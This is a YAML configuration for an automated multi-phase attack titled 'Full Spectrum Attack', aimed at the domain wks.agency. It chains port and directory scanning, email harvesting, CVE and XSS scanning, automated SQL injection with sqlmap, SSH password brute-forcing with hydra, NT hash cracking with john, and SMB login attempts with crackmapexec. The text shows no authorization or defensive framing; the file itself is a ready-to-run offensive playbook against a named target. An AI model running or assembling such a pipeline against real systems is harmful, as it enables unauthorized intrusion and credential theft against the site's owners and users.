name: "Full Spectrum Attack"
target: "https://wks.agency"
phases:
  - name: "recon"
    tools:
      - tool: masscan
        args: ["-p80,443,22", "--rate=1000", "--wait=0"]
      - tool: rustscan
        args: ["-a", "--ulimit", "5000"]
      - tool: nmap
        args: ["-sV", "-p-", "-T4"]
      - tool: whatweb
        args: ["-a", "3"]
      - tool: gobuster
        args: ["dir", "-u", "{{target}}", "-w", "/usr/share/dirb/wordlists/common.txt"]
      - tool: theharvester
        args: ["-d", "wks.agency", "-l", "100", "-b", "google"]
      - tool: ffuf
        args: ["-u", "{{target}}/FUZZ", "-w", "/usr/share/wordlists/dirb/common.txt"]
    parallel: true

  - name: "vulnerability_scan"
    tools:
      - tool: nuclei
        args: ["-t", "cves/", "-severity", "critical,high"]
      - tool: nikto
        args: ["-ssl", "-port", "443"]
      - tool: xsstrike
        args: ["--level", "3"]
    parallel: false
    depends_on: ["recon"]

  - name: "exploitation"
    tools:
      - tool: sqlmap
        args: ["--batch", "--level=2"]
    depends_on: ["vulnerability_scan"]

  - name: "credential"
    tools:
      - tool: hydra
        args: ["-l", "admin", "-P", "/usr/share/nmap/nselib/data/passwords.lst", "ssh://{{target}}"]
      - tool: john
        args: ["--wordlist=/usr/share/john/password.lst", "--format=nt"]
      - tool: crackmapexec
        args: ["smb", "{{target}}", "-u", "admin", "-p", "password"]
    parallel: false
    depends_on: ["recon"]